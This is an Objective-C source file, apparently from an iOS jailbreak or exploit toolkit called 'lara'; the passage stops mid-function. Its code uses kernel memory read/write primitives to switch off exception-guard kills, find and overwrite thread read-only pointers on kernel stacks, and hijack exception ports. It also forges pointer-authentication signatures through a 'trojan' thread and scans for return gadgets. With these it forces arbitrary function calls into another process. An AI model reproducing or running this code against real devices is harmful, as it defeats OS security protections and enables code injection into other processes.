//
//  RemoteCall.m
//  lara
//
//
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <stdint.h>
#include <errno.h>
#include <spawn.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <limits.h>
#include <time.h>
#include <mach-o/dyld.h>
#import <sys/mman.h>

#import "RemoteCall.h"
#import "privateapi.h"
#import "vm.h"
#import "exc.h"
#import "pac.h"
#import "thread.h"
#import "offsets.h"
#import "darksword.h"
#import "utils.h"

extern int proc_name(int pid, void *buffer, uint32_t buffersize);
extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);
extern mach_port_t bootstrap_port;
extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);

#ifndef PROC_PIDPATHINFO_MAXSIZE
#define PROC_PIDPATHINFO_MAXSIZE (4 * PATH_MAX)
#endif

@import ObjectiveC;

@interface NSUserDefaults (LaraLiveContainerRuntime)
+ (bool)isLiveProcess;
+ (NSString *)lcGuestAppId;
@end

static bool g_mig_bypass_enabled = false;
static NSString *g_rc_last_init_error = nil;

#define RC_TASK_EXC_GUARD_MP_DELIVER   0x10
#define RC_TASK_EXC_GUARD_MP_CORPSE    0x40
#define RC_TASK_EXC_GUARD_MP_FATAL     0x80
#define RC_IOS16_RESEARCH_ENABLED      1
#if DEBUG
#define RC_IOS16_DEBUG_LOG(...) do { printf(__VA_ARGS__); } while (0)
#else
#define RC_IOS16_DEBUG_LOG(...) do {} while (0)
#endif

static bool rc_is_ios16(void);
static void rc_ios16_log_return_path_thread(uint64_t thread, const char *stage);

static uint64_t rc_ios16_find_ret_gadget_near(void *symbol) {
    uint64_t center = nativestrip((uint64_t)symbol);
    if (!center) {
        return 0;
    }

    const uint32_t retInstruction = 0xd65f03c0;
    uint64_t scanPage = center & ~0x3fffULL;
    for (uint64_t off = 0; off < 0x4000; off += sizeof(uint32_t)) {
        uint64_t candidate = scanPage + off;
        uint32_t insn = *(volatile uint32_t *)(uintptr_t)candidate;
        if (insn == retInstruction) {
            return candidate;
        }
    }

    return 0;
}

static void rc_ios16_log_local_symbol_probe(const char *label, void *symbol) {
    uint64_t raw = (uint64_t)symbol;
    uint64_t stripped = nativestrip(raw);
    Dl_info info = {0};
    int hasInfo = stripped ? dladdr((void *)(uintptr_t)stripped, &info) : 0;

    RC_IOS16_DEBUG_LOG("(rc.iOS16) local-symbol %s: raw=0x%llx stripped=0x%llx image=%s image_base=%p symbol=%s symbol_addr=%p image_off=0x%llx symbol_off=0x%llx\n",
           label ? label : "(null)",
           raw,
           stripped,
           hasInfo && info.dli_fname ? info.dli_fname : "(none)",
           hasInfo ? info.dli_fbase : NULL,
           hasInfo && info.dli_sname ? info.dli_sname : "(none)",
           hasInfo ? info.dli_saddr : NULL,
           hasInfo && info.dli_fbase ? (unsigned long long)(stripped - (uint64_t)info.dli_fbase) : 0,
           hasInfo && info.dli_saddr ? (unsigned long long)(stripped - (uint64_t)info.dli_saddr) : 0);

    if (!stripped) {
        fflush(stdout);
        return;
    }

    volatile uint32_t *insn = (volatile uint32_t *)(uintptr_t)stripped;
    RC_IOS16_DEBUG_LOG("(rc.iOS16) local-symbol %s insn: [0]=0x%08x [1]=0x%08x [2]=0x%08x [3]=0x%08x [4]=0x%08x [5]=0x%08x [6]=0x%08x [7]=0x%08x\n",
           label ? label : "(null)",
           insn[0],
           insn[1],
           insn[2],
           insn[3],
           insn[4],
           insn[5],
           insn[6],
           insn[7]);
    fflush(stdout);
}

static void rc_ios16_log_local_address_probe(const char *label, uint64_t address) {
    uint64_t stripped = nativestrip(address);
    Dl_info info = {0};
    int hasInfo = stripped ? dladdr((void *)(uintptr_t)stripped, &info) : 0;

    RC_IOS16_DEBUG_LOG("(rc.iOS16) local-address %s: raw=0x%llx stripped=0x%llx image=%s image_base=%p symbol=%s symbol_addr=%p image_off=0x%llx symbol_off=0x%llx\n",
           label ? label : "(null)",
           address,
           stripped,
           hasInfo && info.dli_fname ? info.dli_fname : "(none)",
           hasInfo ? info.dli_fbase : NULL,
           hasInfo && info.dli_sname ? info.dli_sname : "(none)",
           hasInfo ? info.dli_saddr : NULL,
           hasInfo && info.dli_fbase ? (unsigned long long)(stripped - (uint64_t)info.dli_fbase) : 0,
           hasInfo && info.dli_saddr ? (unsigned long long)(stripped - (uint64_t)info.dli_saddr) : 0);

    if (hasInfo) {
        volatile uint32_t *insn = (volatile uint32_t *)(uintptr_t)stripped;
        RC_IOS16_DEBUG_LOG("(rc.iOS16) local-address %s insn: [0]=0x%08x [1]=0x%08x [2]=0x%08x [3]=0x%08x\n",
               label ? label : "(null)",
               insn[0],
               insn[1],
               insn[2],
               insn[3]);
    }
    fflush(stdout);
}

static uint64_t rc_ios16_resolve_second_unconditional_branch_target(const char *label, void *symbol) {
    uint64_t stripped = nativestrip((uint64_t)symbol);
    if (!stripped) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) branch-target %s: symbol stripped to 0\n", label ? label : "(null)");
        fflush(stdout);
        return 0;
    }

    volatile uint32_t *insn = (volatile uint32_t *)(uintptr_t)stripped;
    uint32_t branchInsn = insn[1];
    if ((branchInsn & 0xfc000000U) != 0x14000000U) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) branch-target %s: second insn is not B imm, insn=0x%08x\n",
               label ? label : "(null)",
               branchInsn);
        fflush(stdout);
        return 0;
    }

    int32_t imm26 = (int32_t)(branchInsn & 0x03ffffffU);
    if (imm26 & 0x02000000U) {
        imm26 |= (int32_t)0xfc000000U;
    }

    uint64_t branchPC = stripped + sizeof(uint32_t);
    uint64_t target = (uint64_t)((int64_t)branchPC + ((int64_t)imm26 << 2));
    RC_IOS16_DEBUG_LOG("(rc.iOS16) branch-target %s: stripped=0x%llx branch_pc=0x%llx insn=0x%08x target=0x%llx\n",
           label ? label : "(null)",
           stripped,
           branchPC,
           branchInsn,
           target);
    fflush(stdout);
    return target;
}

static BOOL rc_is_kernel_ptr(uint64_t value) {
    return ds_isvalid(value);
}

static BOOL rc_is_kernel_or_smr_ptr(uint64_t value) {
    if (!value) {
        return NO;
    }
    if (rc_is_kernel_ptr(value)) {
        return YES;
    }

    // ds_kreadsmrptr() can return compact kalloc/SMR table pointers outside
    // VM_MIN_KERNEL_ADDRESS on PAC devices; the original IPC lookup uses them.
    return (value & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

static bool rc_livecontainer_api_is_liveprocess(void) {
    return [NSUserDefaults respondsToSelector:@selector(isLiveProcess)] && [NSUserDefaults isLiveProcess];
}

static void rc_current_process_identity(char kernelName[64], char hostName[64], char guestName[64]) {
    kernelName[0] = '\0';
    hostName[0] = '\0';
    guestName[0] = '\0';

    if (proc_name(getpid(), kernelName, 64) <= 0) {
        kernelName[0] = '\0';
    }

    char hostPath[PROC_PIDPATHINFO_MAXSIZE] = {0};
    if (proc_pidpath(getpid(), hostPath, sizeof(hostPath)) > 0) {
        const char *hostBase = strrchr(hostPath, '/');
        hostBase = hostBase ? hostBase + 1 : hostPath;
        if (hostBase && hostBase[0]) {
            snprintf(hostName, 64, "%s", hostBase);
        }
    }

    char executablePath[PROC_PIDPATHINFO_MAXSIZE] = {0};
    uint32_t executablePathLength = sizeof(executablePath);
    if (_NSGetExecutablePath(executablePath, &executablePathLength) == 0) {
        const char *guestBase = strrchr(executablePath, '/');
        guestBase = guestBase ? guestBase + 1 : executablePath;
        if (guestBase && guestBase[0]) {
            snprintf(guestName, 64, "%s", guestBase);
        }
    }
}

static bool rc_name_is_liveprocess(const char *name) {
    return name && strncmp(name, "LiveProcess", 64) == 0;
}

static bool rc_livecontainer_is_actual_liveprocess(bool liveContainerRuntime) {
    if (!liveContainerRuntime) {
        return false;
    }
    if (rc_livecontainer_api_is_liveprocess()) {
        return true;
    }

    char kernelName[64] = {0};
    char hostName[64] = {0};
    char guestName[64] = {0};
    rc_current_process_identity(kernelName, hostName, guestName);
    if (rc_name_is_liveprocess(kernelName) || rc_name_is_liveprocess(hostName) || rc_name_is_liveprocess(guestName)) {
        return true;
    }

    return false;
}

static BOOL rc_disable_excguard_kill_checked(uint64_t task) {
    if (!rc_is_kernel_ptr(task) || !off_task_task_exc_guard) {
        return NO;
    }

    uint64_t addr = task + off_task_task_exc_guard;
    uint32_t before = ds_kread32(addr);

    if (before & 0xffff0000U) {
        return NO;
    }

    uint32_t after = before;
    after &= ~(RC_TASK_EXC_GUARD_MP_CORPSE | RC_TASK_EXC_GUARD_MP_FATAL);
    after |= RC_TASK_EXC_GUARD_MP_DELIVER;
    ds_kwrite32(addr, after);

    uint32_t verify = ds_kread32(addr);
    if ((verify & (RC_TASK_EXC_GUARD_MP_CORPSE | RC_TASK_EXC_GUARD_MP_FATAL)) ||
        !(verify & RC_TASK_EXC_GUARD_MP_DELIVER)) {
        return NO;
    }

    return YES;
}

static uint64_t rc_task_get_ipc_port_object(uint64_t task, mach_port_t port) {
    if (!rc_is_kernel_ptr(task) || port == MACH_PORT_NULL) {
        return 0;
    }

    uint64_t itk_space = ds_kreadptr(task + off_task_itk_space);
    if (!rc_is_kernel_ptr(itk_space)) {
        return 0;
    }

    if (!sizeof_ipc_entry || !off_ipc_space_is_table) {
        return 0;
    }

    uint64_t table = ds_kreadsmrptr(itk_space + off_ipc_space_is_table);
    if (!is_pac_supported()) {
        table |= 0xFFFFFF8000000000ULL;
        table = ds_kallocarrdec(table);
    }
    if (!rc_is_kernel_or_smr_ptr(table)) {
        return 0;
    }

    uint64_t entry = table + (sizeof_ipc_entry * (port >> 8));
    if (!rc_is_kernel_or_smr_ptr(entry)) {
        return 0;
    }

    uint64_t object = ds_kreadptr(entry + off_ipc_entry_ie_object);
    if (!rc_is_kernel_ptr(object)) {
        return 0;
    }

    return object;
}

static uint64_t rc_task_get_ipc_port_kobject(uint64_t task, mach_port_t port) {
    uint64_t object = rc_task_get_ipc_port_object(task, port);
    if (!object) {
        return 0;
    }

    uint64_t kobject = ds_kreadptr(object + off_ipc_port_ip_kobject);
    if (!rc_is_kernel_ptr(kobject)) {
        return 0;
    }

    return kobject;
}

void mig_bypass_init(uint64_t kernelSlide, uint64_t migLockOff, uint64_t migSbxMsgOff, uint64_t migKernelStackLROff) {
    printf("(rc) mig bypass init stub - not implemented yet\n");
}

void mig_bypass_start(void) { }
void mig_bypass_resume(void) { }
void mig_bypass_pause(void) { }
void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2) { }

@interface RemoteCall (iOS16)
- (BOOL)setExceptionPortOnThreadIOS16:(mach_port_t)exceptionPort forThread:(uint64_t)currThread useMigFilterBypass:(BOOL)useMigFilterBypass;
- (int)initRemoteCallForProcessIOS16:(const char *)process useMigFilterBypass:(BOOL)useMigFilterBypass;
- (BOOL)verifyIOS16ExceptionActionsForThread:(uint64_t)thread exceptionPort:(mach_port_t)exceptionPort stage:(const char *)stage;
- (BOOL)installIOS16SharedDummyExceptionActionsForThread:(uint64_t)thread exceptionPort:(mach_port_t)exceptionPort exceptionMask:(uint32_t)exceptionMask;
- (void)rememberIOS16ExceptionActionsForThreadRo:(uint64_t)threadRo originalActions:(uint64_t)actions;
- (void)restoreIOS16ExceptionActions;
- (void)restoreIOS16ExceptionActionsSkippingThreadRo:(uint64_t)skipThreadRo;
- (BOOL)preflightRemotePaciaGadgetForProcessIOS16:(const char *)process result:(NSMutableString *)result;
- (BOOL)runFirstLandingPaciaProbeWithResult:(NSMutableString *)result exceptionPort:(mach_port_t)exceptionPort exception:(excmsg *)exc thread:(uint64_t)thread firstPortAddr:(uint64_t)firstPortAddr;
@end

@implementation RemoteCall

+ (NSString *)lastInitError {
    return g_rc_last_init_error;
}

+ (BOOL)isLiveContainerRuntime {
    return islcruntime();
}

+ (BOOL)isLiveProcessRuntime {
    return rc_livecontainer_is_actual_liveprocess(islcruntime());
}

// bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
- (BOOL)setExceptionPortOnThread:(mach_port_t)exceptionPort forThread:(uint64_t)currThread useMigFilterBypass:(BOOL)useMigFilterBypass {
    if (rc_is_ios16()) {
        return [self setExceptionPortOnThreadIOS16:exceptionPort forThread:currThread useMigFilterBypass:useMigFilterBypass];
    }

    bool success = false;
    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
        return false;
    }
    
    pthread_t pthread = NULL;
    int pthreadErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (pthreadErr != 0 || !pthread) {
        return false;
    }
    
    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (machThread == MACH_PORT_NULL) {
        pthread_cancel(pthread);
        return false;
    }

    uint64_t machThreadAddr = rc_task_get_ipc_port_kobject(task_self(), machThread);
    if (!machThreadAddr) {
        pthread_cancel(pthread);
        return false;
    }

    if(useMigFilterBypass) {
        mig_bypass_monitor_threads(_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        pthread_cancel(pthread);
        return false;
    }
    
    uint64_t diver = 0;
    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
    
    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
    
    uint64_t exceptionMask = EXC_MASK_GUARD |
                             EXC_MASK_BAD_ACCESS |
                             EXC_MASK_BAD_INSTRUCTION |
                             EXC_MASK_BREAKPOINT |
                             EXC_MASK_ARITHMETIC;

    state.__x[0] = _dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;
    
    if(useMigFilterBypass)
        usleep(100000);
    
    if (!threadsetstate(machThread, machThreadAddr,
                                  (arm_thread_state64_internal *)&state)) {
        pthread_cancel(pthread);
        return false;
    }
    
    if(useMigFilterBypass)
        usleep(100000);
    
    thread_set_mutex(_dummyThreadAddr, _selfThreadCtid);
    
    if (!threadresume(machThread)) {
        pthread_cancel(pthread);
        return false;
    }
    
    for (int i = 0; i < 10; i++)
    {
        usleep(200000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!kstack) {
            printf("(rc) [iter %d] Failed to get kstack. Retry...\n", i);
            fflush(stdout);
            continue;
        }
        
        uint64_t kernelSP = ds_kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!kernelSP) {
            printf("(rc) [iter %d] Failed to get SP. Retry...\n", i);
            fflush(stdout);
            continue;
        }
        usleep(100);

        printf("(rc) [iter %d] kstack=0x%llx kernelSP=0x%llx\n", i, kstack, kernelSP);
        fflush(stdout);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        ds_kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = _dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("(rc) [iter %d] Couldn't find g_RC_dummyThreadTro=0x%llx in pageBase=0x%llx\n", i, needleVal, pageBase);
            fflush(stdout);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        printf("(rc) [iter %d] Found TRO at offset=0x%llx\n", i, found);
        fflush(stdout);
        memset(dataBuff, 0, 0x1000);
        
        bool correctTro = false;
        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal  = ds_kread64(checkAddr);
        
        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;
        uint64_t checkVal2  = ds_kread64(checkAddr2);

        printf("(rc) [iter %d] checkVal=0x%llx checkVal2=0x%llx (expecting 0x%llx)\n", i, checkVal, checkVal2, exceptionMask);
        fflush(stdout);

        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
            correctTro = true;
        } else {
            printf("(rc) [iter %d] Wrong tro checkVals (0x%llx, 0x%llx) != 0x%llx. Retry...\n", i, checkVal, checkVal2, exceptionMask);
            fflush(stdout);
            continue;
        }
        
        if (found && correctTro) {
            if (thread_get_task(currThread) == _taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                uint64_t swapAddr = trunc_page(kernelSP) + found;
                printf("(rc) [iter %d] TRO swap: writing target tro=0x%llx to addr=0x%llx\n", i, tro, swapAddr);
                fflush(stdout);
                ds_kwrite64(swapAddr, tro);
                success = true;
                printf("(rc) TRO swap SUCCESS!\n");
                fflush(stdout);
                break;
            } else {
                printf("(rc) got empty tro, skip writing\n");
                fflush(stdout);
            }
        } else {
            NSLog(@"(rc) didnt find tro for 0x%llx", (uint64_t)currThread);
        }
    }
    
    printf("(rc) set_exception_port_on_thread returning success=%d\n", success);
    fflush(stdout);
    
    thread_set_mutex(_dummyThreadAddr, 0x40000000);
    
    thread_set_exception_ports(_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    
    if(useMigFilterBypass)
        usleep(100000);

    return success;
}

// void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
- (void)signState:(uint64_t)signingThread withState:(arm_thread_state64_internal *)state pc:(uint64_t)pc lr:(uint64_t)lr
{
    if(is_pac_supported()) {
        uint64_t diver = 0;
        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauthblend(diver, ptrauthstrdisc("pc"));
        uint64_t discLR = ptrauthblend(diver, ptrauthstrdisc("lr"));
        uint64_t strippedPC = nativestrip(pc);
        uint64_t strippedLR = nativestrip(lr);
        uint64_t signedPC = 0;
        uint64_t signedLR = 0;
        
        if (pc) {
            signedPC = remotepac(signingThread, pc, discPC);
            if (!signedPC || signedPC == UINT64_MAX) {
                signedPC = strippedPC;
            }
        }
        if (lr) {
            signedLR = remotepac(signingThread, lr, discLR);
            if (!signedLR || signedLR == UINT64_MAX) {
                signedLR = strippedLR;
            }
        }

        printf("(rc) signState: thread=0x%llx flags_before=0x%x diver=0x%llx pc_raw=0x%llx pc_signed=0x%llx lr_raw=0x%llx lr_signed=0x%llx\n",
               signingThread,
               state->__flags,
               diver,
               strippedPC,
               signedPC,
               strippedLR,
               signedLR);
        fflush(stdout);
        rc_ios16_log_return_path_thread(signingThread, "signState");

        uint32_t flags = state->__flags;
        flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC |
                   __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                   __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
        state->__flags = flags;
        if (pc) state->__pc = signedPC;
        if (lr) state->__lr = signedLR;
        if (rc_is_ios16()) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) signState flags after clear: flags_after=0x%x pc_set=%d lr_set=%d\n",
                   state->__flags,
                   pc != 0,
                   lr != 0);
            fflush(stdout);
        }
        return;
    }
    
    if(!is_pac_supported()) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
}

//uint64_t do_remote_call_temp(int timeout, const char *name,
//                             uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
//                             uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
- (NSUInteger)doRemoteCallTempWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void*)ptr
                                     args:(uint64_t *)args argCount:(NSUInteger)argCount
{
    return [self doRemoteCallInternalTimeout:timeout exceptionPort:_firstExceptionPort
                                                 lrMarker:(_firstThreadReturnTrap ?: FAKE_LR_TROJAN_CREATOR) functionName:name functionPointer:ptr args:args argCount:argCount];
}

- (NSUInteger)doRemoteCallWithPendingException:(excmsg *)exc
                                       timeout:(int)timeout
                                 exceptionPort:(mach_port_t)exceptionPort
                                      lrMarker:(uint64_t)lrMarker
                                  functionName:(char *)name
                               functionPointer:(void *)ptr
                                          args:(uint64_t *)args
                                      argCount:(NSUInteger)argCount
{
    int newTimeout = (10000 > timeout) ? 10000 : timeout;
    uint64_t pcAddr = nativestrip((uint64_t)ptr);

    if (argCount > 8) {
        uint64_t sp = nativestrip(exc->threadState.__sp);
        for (NSUInteger i = 8; i < argCount; i++) {
            self[sp + ((i - 8) * sizeof(uint64_t))].value64 = args[i];
        }
        argCount = 8;
    }
    memcpy(&exc->threadState.__x[0], args, argCount * sizeof(uint64_t));
    bzero(&exc->threadState.__x[argCount], (8 - argCount) * sizeof(uint64_t));
    [self signState:_trojanThreadAddr withState:&exc->threadState pc:pcAddr lr:lrMarker];
    if (_liveContainerRuntime && is_pac_supported() &&
        (exc->threadState.__pc == pcAddr || exc->threadState.__lr == nativestrip(lrMarker))) {
        self.lastError = @"LiveContainer RemoteCall PAC signing returned raw pointers.";
        return 0;
    }

    if (!statereply(exc, &exc->threadState)) {
        return 0;
    }

    if (timeout < 0) {
        return 0;
    }

    excmsg exc2;
    if (!waitexc(exceptionPort, &exc2, newTimeout, false)) {
        return 0;
    }
    uint64_t returnPC = nativestrip(exc2.threadState.__pc);
    uint64_t returnLR = nativestrip(exc2.threadState.__lr);
    if (returnPC != nativestrip(lrMarker) && returnLR != nativestrip(lrMarker)) {
        self.lastError = [NSString stringWithFormat:@"Unexpected trap after %s: pc=0x%llx lr=0x%llx", name, exc2.threadState.__pc, exc2.threadState.__lr];
        return 0;
    }

    uint64_t retValue = exc2.threadState.__x[0];
    if (!statereply(&exc2, &exc2.threadState)) {
        return 0;
    }

    return retValue;
}

//uint64_t do_remote_call_stable(int timeout, const char *name,
//                               uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
//                               uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
- (NSUInteger)doRemoteCallStableWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void*)pcAddr
                            args:(uint64_t *)args argCount:(NSUInteger)argCount
{
    if (!_creatingExtraThread)
        //return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
        return [self doRemoteCallTempWithTimeout:timeout functionName:name functionPointer:pcAddr args:args argCount:argCount];
    return [self doRemoteCallInternalTimeout:timeout exceptionPort:_secondExceptionPort lrMarker:(_secondThreadReturnTrap ?: FAKE_LR_TROJAN)
                                functionName:name functionPointer:pcAddr args:args argCount:argCount];
}

//uint64_t do_remote_call_temp(int timeout, const char *name,
//                             uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
//                             uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
- (NSUInteger)doRemoteCallInternalTimeout:(int)timeout exceptionPort:(mach_port_t)exceptionPort
                                 lrMarker:(uint64_t)lrMarker
                             functionName:(char *)name functionPointer:(void*)ptr
                                     args:(uint64_t *)args argCount:(NSUInteger)argCount
{
    int newTimeout = (10000 > timeout) ? 10000 : timeout;
    uint64_t pcAddr = nativestrip((uint64_t)ptr);
    printf("(rc) pcAddr for %s: 0x%llx\n", name, pcAddr);
    fflush(stdout);
    BOOL isTempCall = (exceptionPort == _firstExceptionPort);

    excmsg exc;
    printf("(rc) Waiting for exception...\n");
    fflush(stdout);
    const char *threadStr = isTempCall ? "original" : "new";
    if (!waitexc(exceptionPort, &exc, newTimeout, false)) {
        printf("(rc) Don't receive first exception on %s thread\n", threadStr);
        return 0;
    }
    printf("(rc) Exception received, setting up args and replying: name=%s temp=%d exc=0x%x code=[0x%llx 0x%llx] pc=0x%llx lr=0x%llx sp=0x%llx flags=0x%x trojan=0x%llx\n",
           name, isTempCall,
           exc.exception,
           exc.codeFirst,
           exc.codeSecond,
           exc.threadState.__pc,
           exc.threadState.__lr,
           exc.threadState.__sp,
           exc.threadState.__flags,
           _trojanThreadAddr);
    fflush(stdout);
    rc_ios16_log_return_path_thread(_trojanThreadAddr, "remote-call-before-reply");

    if (argCount > 8) {
        uint64_t sp = nativestrip(exc.threadState.__sp);
        for (int i = 8; i < argCount; i++) {
            self[sp + ((i - 8) * sizeof(uint64_t))].value64 = args[i];
        }
        argCount = 8;
    }
    memcpy(&exc.threadState.__x[0], args, argCount * sizeof(uint64_t));
    bzero(&exc.threadState.__x[argCount], (8 - argCount) * sizeof(uint64_t));
    [self signState:_trojanThreadAddr withState:&exc.threadState pc:pcAddr lr:lrMarker];
    printf("(rc) Replying remote call: name=%s pc=0x%llx lr=0x%llx sp=0x%llx flags=0x%x x0=0x%llx x1=0x%llx\n",
           name,
           exc.threadState.__pc,
           exc.threadState.__lr,
           exc.threadState.__sp,
           exc.threadState.__flags,
           exc.threadState.__x[0],
           exc.threadState.__x[1]);
    fflush(stdout);
    if (!statereply(&exc, &exc.threadState)) {
        return 0;
    }

    if (timeout < 0) {
        if (ptr == pthread_exit) {
            printf("(rc) Trojan thread cleanup\n");
        }
        return 0;
    }

    excmsg exc2;
    if (!waitexc(exceptionPort, &exc2, newTimeout, false)) {
        printf("(rc) Don't receive second exception on %s thread\n", threadStr);
        return 0;
    }
    uint64_t returnPC = nativestrip(exc2.threadState.__pc);
    uint64_t returnLR = nativestrip(exc2.threadState.__lr);
    printf("(rc) Return exception: name=%s temp=%d exc=0x%x code=[0x%llx 0x%llx] pc=0x%llx lr=0x%llx returnPC=0x%llx returnLR=0x%llx expected=0x%llx x0=0x%llx flags=0x%x\n",
           name, isTempCall,
           exc2.exception,
           exc2.codeFirst,
           exc2.codeSecond,
           exc2.threadState.__pc,
           exc2.threadState.__lr,
           returnPC,
           returnLR,
           nativestrip(lrMarker),
           exc2.threadState.__x[0],
           exc2.threadState.__flags);
    fflush(stdout);
    if (returnPC == pcAddr) {
        printf("(rc) Remote call faulted at function entry: name=%s pc=0x%llx code=[0x%llx 0x%llx]; parking thread before restore\n",
               name, exc2.threadState.__pc, exc2.codeFirst, exc2.codeSecond);
        fflush(stdout);
        if (rc_is_ios16() && isTempCall) {
            [self signState:_trojanThreadAddr withState:&exc2.threadState pc:lrMarker lr:lrMarker];
            RC_IOS16_DEBUG_LOG("(rc.iOS16) signed fault-entry park trap: name=%s pc=0x%llx lr=0x%llx marker=0x%llx\n",
                   name,
                   exc2.threadState.__pc,
                   exc2.threadState.__lr,
                   lrMarker);
            fflush(stdout);
        } else {
            exc2.threadState.__pc = lrMarker;
            exc2.threadState.__lr = lrMarker;
        }
        if (!statereply(&exc2, &exc2.threadState)) {
            printf("(rc) Failed to park faulted remote call thread\n");
            fflush(stdout);
        }
        self.lastError = [NSString stringWithFormat:@"Remote call faulted at %s entry pc=0x%llx", name, exc2.threadState.__pc];
        return 0;
    }
    BOOL unexpectedReturnTrap = (returnPC != nativestrip(lrMarker) && returnLR != nativestrip(lrMarker));
    if (rc_is_ios16() && isTempCall && name && strcmp(name, "ret_gadget") == 0 &&
        returnPC != pcAddr + sizeof(uint32_t) &&
        returnPC != nativestrip(lrMarker)) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) ret_gadget probe rejected: returnPC=0x%llx expected_pc_after_ret=0x%llx expected_marker=0x%llx returnLR=0x%llx marker=0x%llx code=[0x%llx 0x%llx]\n",
               returnPC,
               pcAddr + sizeof(uint32_t),
               nativestrip(lrMarker),
               returnLR,
               nativestrip(lrMarker),
               exc2.codeFirst,
               exc2.codeSecond);
        fflush(stdout);
        unexpectedReturnTrap = YES;
    }
    if (unexpectedReturnTrap) {
        printf("(rc) Process might have crashed! Unexpected trap: pc=0x%llx lr=0x%llx expected=0x%llx\n",
               exc2.threadState.__pc, exc2.threadState.__lr, lrMarker);
        if (rc_is_ios16()) {
            rc_ios16_log_local_address_probe("unexpected-trap-pc", returnPC);
            rc_ios16_log_local_address_probe("unexpected-trap-lr", returnLR);
            rc_ios16_log_local_address_probe("unexpected-trap-codeSecond", exc2.codeSecond);
        }
        rc_ios16_log_return_path_thread(_trojanThreadAddr, "unexpected-return-trap");
        NSLog(@"%@", NSThread.callStackSymbols);
        self.lastError = [NSString stringWithFormat:@"Process might have crashed! Unexpected trap pc=0x%llx lr=0x%llx", exc2.threadState.__pc, exc2.threadState.__lr];
        if (rc_is_ios16() && isTempCall && _originalThreadNeedsRestore) {
            arm_thread_state64_internal restoreState = _originalState;
            restoreState.__flags = exc2.threadState.__flags;
            RC_IOS16_DEBUG_LOG("(rc.iOS16) restoring original thread from unexpected temp trap: name=%s original_pc=0x%llx original_lr=0x%llx trap_pc=0x%llx trap_lr=0x%llx trap_x0=0x%llx flags=0x%x\n",
                   name,
                   restoreState.__pc,
                   restoreState.__lr,
                   exc2.threadState.__pc,
                   exc2.threadState.__lr,
                   exc2.threadState.__x[0],
                   restoreState.__flags);
            fflush(stdout);
            [self signState:_trojanThreadAddr withState:&restoreState pc:restoreState.__pc lr:restoreState.__lr];
            BOOL restored = statereply(&exc2, &restoreState);
            RC_IOS16_DEBUG_LOG("(rc.iOS16) unexpected temp trap restore reply=%d\n", restored);
            fflush(stdout);
            _originalThreadNeedsRestore = false;
            [self destroyRemoteCall];
            return 0;
        }
        [self destroyRemoteCall];
    }
    uint64_t retValue = exc2.threadState.__x[0];
    if (!statereply(&exc2, &exc2.threadState)) {
        return 0;
    }
